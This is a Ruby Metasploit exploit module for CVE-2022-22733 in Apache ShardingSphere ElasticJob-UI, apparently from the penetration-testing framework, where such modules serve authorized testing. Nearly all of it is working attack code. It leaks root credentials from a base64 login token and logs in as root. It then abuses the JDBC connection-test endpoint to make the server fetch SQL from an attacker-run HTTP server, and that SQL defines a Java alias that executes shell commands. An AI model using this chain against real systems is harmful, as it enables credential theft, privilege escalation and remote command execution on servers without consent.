class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpServer
  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Apache ShardingSphere ElasticJob-UI CVE-2022-22733 Exploit',
        'Description' => %q{
          Apache ShardingSphere ElasticJob-UI 3.x, including version 3.0.0, as well as prior alpha and beta versions, are
          vulnerable to CVE-2022-22733, a vulnerability that allows an attacker who has a guest account to leak sensitive information
          and perform a privilege escalation attack.

          This vulnerability occurs because, when logging into the application via a POST request to "/api/login", the server
          returns a response containing a "accessToken" field that contains a base64 encoded value. Upon decoding this value,
          an attacker can obtain the root username and password, as well as the guest username and password, in plaintext.

          By using these leaked credentials, an attacker can log into the application as the privileged "root" user, and then
          perform a privilege escalation attack by using the "/api/data-source/connectTest" endpoint to make a JDBC connection
          to an attacker controlled web server.

          By hosting a malicious SQL file on the web server, an attacker can execute arbitrary SQL statements on the
          Apache ShardingSphere ElasticJob-UI server by abusing the built in ability to create aliases in SQL that execute
          arbitrary commands. By then executing the created alias, the attacker can gain RCE as the "XXX" user.
        },
        'Author' => [
          'Zeyad Azima', # Metasploit module and research to make PoC.
          'Grant Willcox' # Tidying up on Metasploit module, porting RCE component, adding attribution.
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2022-22733'],
          ['URL', 'https://www.vicarius.io/vsociety/blog/cve-2022-22733-apache-shardingsphere-elasticjob-ui-privilege-escalation'], # Writeup part 1
          ['URL', 'https://www.vicarius.io/vsociety/blog/unique-exploit-cve-2022-22733-privilege-escalation-and-rce'], # Writeup part 2
          ['URL', 'https://y4er.com/posts/cve-2022-22733-apache-shardingsphere-elasticjob-ui-rce/'], # First known public writeup
          ['URL', 'https://github.com/apache/shardingsphere-elasticjob-ui/commit/f3afe51221cd2382e59afc4b9544c6c8a4448a99?diff=split'], # Patch in code
          ['URL', 'https://lists.apache.org/thread/qpdsm936n9bhksb0rzn6bq1h7ord2nm6'] # Vendor acknowledgement
        ],
        'DefaultOptions' => {
          'RPORT' => 8088,
          'SSL' => false,
          'DisablePayloadHandler' => true
        },
        'Platform' => ['win', 'linux'],
        'Targets' => [ [ 'Automatic', {} ] ],
        'DisclosureDate' => '2022-01-20',
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options(
      [
        OptString.new('USERNAME', [ true, 'The username to authenticate with', 'guest']),
        OptString.new('PASSWORD', [ true, 'The password to authenticate with', 'guest'])
      ]
    )
  end

  def check
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => '/'
    })

    if res && res.code == 200 && res&.body&.match(/ShardingSphere ElasticJob UI/) && res&.body&.match(%r{/static/js/manifest})
      return Exploit::CheckCode::Detected('The target is running ShardingSphere ElasticJob UI, but we could not retrieve the version running.')
    else
      return Exploit::CheckCode::Safe('The target does not appear to be running ShardingSphere ElasticJob UI!')
    end
  rescue ::Rex::ConnectionError
    return Exploit::CheckCode::Unknown("#{peer} - Connection failed")
  end

  def exploit
    print_status('Attempting to authenticate with provided credentials...')

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => '/api/login',
      'ctype' => 'application/json',
      'data' => { 'username' => datastore['USERNAME'], 'password' => datastore['PASSWORD'] }.to_json
    })

    unless res && res.code == 200
      fail_with(Failure::NoAccess, 'Authentication failed')
    end

    json_res = res.get_json_document
    unless json_res['success'] == true && json_res['errorCode'] == 0
      fail_with(Failure::NoAccess, '200 OK returned, but authentication failed')
    end

    print_status('Getting accessToken details...')
    access_token = json_res.dig('model', 'accessToken')
    unless access_token
      fail_with(Failure::UnexpectedReply, 'Target did not respond with a response containing an accessToken field!')
    end

    print_good("Authenticated successfully as #{datastore['USERNAME']}")

    print_status("Obtaining root credentials from accessToken field of the server's response...")
    decoded_access_token = Base64.decode64(access_token)
    decoded_json = JSON.parse(decoded_access_token)

    root_username = decoded_json['rootUsername']
    root_password = decoded_json['rootPassword']

    print_good("Root username: #{root_username}")
    print_good("Root password: #{root_password}")

    # Now that we have the leaked root credentials, validate them.
    print_status('Attempting to authenticate with root credentials...')

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => '/api/login',
      'ctype' => 'application/json',
      'data' => { 'username' => root_username, 'password' => root_password }.to_json
    })

    unless res && res.code == 200
      fail_with(Failure::NoAccess, 'Authentication with root credentials failed')
    end

    # At this point we need to validate that the accessToken is not a guest user to double check.
    json_res = res.get_json_document
    unless json_res['success'] == true && json_res['errorCode'] == 0 && json_res.dig('model', 'isGuest') == false && json_res.dig('model', 'username') == 'root'
      fail_with(Failure::NoAccess, '200 OK returned, but authentication failed as root user!')
    end

    # Finally double check we actually got the accessToken for the root user.
    root_access_token = json_res.dig('model', 'accessToken')
    unless root_access_token
      fail_with(Failure::UnexpectedReply, 'Target did not respond with a response containing an accessToken field when logging in as root!')
    end

    print_good('Successfully logged in as the root user!')

    # Start the JDBC attack now that we have appropriate permissions to do a test JDBC connection.
    print_status('Attempting JDBC attack...')

    # Start HTTP server
    @resource_uri = "/#{Rex::Text.rand_text_alphanumeric(8..20)}.sql"
    jdbc_string = "http://#{datastore['SRVHOST']}:#{datastore['SRVPORT']}/#{@resource_uri}"
    print_status("Starting up our HTTP server on #{jdbc_string}")
    start_service({
      'Uri' => {
        'Proc' => proc do |cli, req|
          on_request_uri(cli, req)
        end,
        'Path' => @resource_uri
      }
    })

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => '/api/data-source/connectTest',
      'ctype' => 'application/json',
      'headers' => {
        'Access-Token' => root_access_token
      },
      'data' => { 'name' => Rex::Text.rand_text_alphanumeric(8..20), 'driver' => 'org.h2.Driver', 'url' => "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM '#{jdbc_string}'", 'username' => Rex::Text.rand_text_alphanumeric(4..20), 'password' => Rex::Text.rand_text_alphanumeric(4..20) }.to_json
    })

    unless res && res.code == 200
      fail_with(Failure::UnexpectedReply, 'JDBC attack failed')
    end

    json_res = res.get_json_document
    unless json_res['success'] == true
      fail_with(Failure::UnexpectedReply, "JDBC attack failed. The error message was #{json_res['errorMsg']}")
    end

    print_good('JDBC attack successful')
  rescue JSON::ParserError
    fail_with(Failure::UnexpectedReply, "Failed to parse the server's responses")
  rescue ::Rex::ConnectionError
    fail_with(Failure::Unreachable, "#{peer} - Connection failed")
  end

  def on_request_uri(cli, request)
    unless request.raw_uri == @resource_uri
      vprint_error("Request came in but it wasn't for the right URI!")
      return
    end

    payload = "CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd);return \"123\";}';CALL EXEC (\"/bin/bash -c 'echo a > /tmp/test.txt'\")"
    print_status("#{datastore['SRVHOST']}:#{datastore['SRVPORT']} - Sending payload to target...")
    send_response(cli, payload)
  end
end
